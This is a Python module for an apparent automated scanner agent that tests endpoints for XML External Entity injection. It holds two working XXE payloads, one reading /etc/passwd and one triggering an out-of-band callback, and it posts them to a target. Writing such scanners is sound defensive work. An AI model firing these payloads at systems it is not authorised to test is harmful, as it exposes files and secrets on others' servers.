# agents/specialists/xxe_specialist.py
import logging
import uuid
from typing import List

import aiohttp

from agents.specialist_base import ISpecialist, OOBMixin
from core.types import MultiSessionContext, TargetScope, VulnCategory
from triage.noise_filter import Finding

logger = logging.getLogger(__name__)


class XXESpecialist(OOBMixin, ISpecialist):
    """XML External Entity (XXE) Injection specialist agent."""

    @property
    def category(self) -> VulnCategory:
        return VulnCategory.XXE

    async def scan(
        self,
        target: str,
        scope: TargetScope,
        session_ctx: MultiSessionContext,
        correlation_id: str,
    ) -> List[Finding]:
        findings = []

        if await self.check_false_positive(target):
            return findings

        oob_payload = self.embed_oob_payload(context={
            "endpoint": target,
            "category": self.category.value,
            "correlation_id": correlation_id,
        })

        payloads = [
            f"""<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [  
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <foo>&xxe;</foo>""",
            f"""<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [  
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "{oob_payload}" >]>
            <foo>&xxe;</foo>""",
        ]

        async with aiohttp.ClientSession() as session:
            for p in payloads:
                try:
                    async with session.post(
                        target,
                        data=p,
                        headers={"Content-Type": "application/xml"},
                        timeout=10,
                    ) as response:
                        body = await response.text()
                        if "root:x:" in body:
                            finding = Finding(
                                finding_id=f"xxe_{uuid.uuid4().hex[:8]}",
                                title="XML External Entity (XXE) Injection Confirmed",
                                description="Able to read local files via XML external entity inclusion.",
                                vuln_category=self.category.value,
                                endpoint=target,
                                evidence={
                                    "payload": p,
                                    "oob_payload": oob_payload,
                                    "response": body[:200],
                                },
                                confidence=0.95,
                            )
                            findings.append(finding)
                except Exception as e:
                    logger.warning(f"Error posting XML to {target}: {e}")

        return findings
